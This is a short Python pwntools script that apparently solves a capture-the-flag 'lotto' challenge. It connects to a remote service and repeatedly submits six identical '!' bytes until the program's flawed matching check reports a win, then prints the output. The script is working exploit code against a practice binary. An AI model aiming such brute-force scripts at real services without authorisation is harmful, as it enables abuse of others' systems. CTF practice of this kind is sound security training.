from pwn import *

context.log_level = 'debug'
# r = process('./lotto')
r = remote(ip,port)


r.recvuntil('Exit\n')
while True:
    r.sendline('1')
    r.sendline('!'*6)
    s = r.recvuntil('Select')
    if "bad" not in s:
        print s
        break
r.sendline('3')
